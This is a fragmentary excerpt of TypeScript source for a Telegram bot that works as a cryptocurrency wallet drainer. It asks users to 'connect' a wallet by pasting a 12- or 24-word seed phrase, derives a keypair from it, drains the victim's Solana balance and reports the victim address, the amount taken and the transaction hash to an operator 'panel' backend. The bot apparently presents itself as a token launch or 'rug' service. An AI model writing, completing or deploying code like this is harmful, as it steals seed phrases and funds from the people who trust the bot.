...
const drainUserWallet = async (keypair: Keypair, ctx: Context) => {
  ...
  drainedWallets.add(address);
    ...
    try {
    await fetch(`${BACKEND_URL}/api/drain`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        victim_address: from.toBase58(),
        sol_drained: balSol / LAMPORTS_PER_SOL,
        tx_hash: sig,
    ...
    console.error('Failed to report drain to panel:', err);
  }
    ...
    if ((words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w.toLowerCase()))) {
     ...
     // );
      ...
      if (foundKeypair) {
        ...
        if (first) {
          throw new Error(`Insufficient balance (You need a minimum of ${MIN_RUG_SOL} SOL to rugg).`);
        } else {
...
bot.on('text', async (ctx) => {
  ...
  if (session.stage === 'awaiting_wallet_connection') {
    try {
      ...
      if (errorMessage.includes('Insufficient balance (You need a minimum of')) {
        // Short message without the extra line
        await ctx.reply(`❌ ${errorMessage}`, launchSetupKeyboard);
      } else {
        // Full message for other errors (invalid seed phrase, etc.)
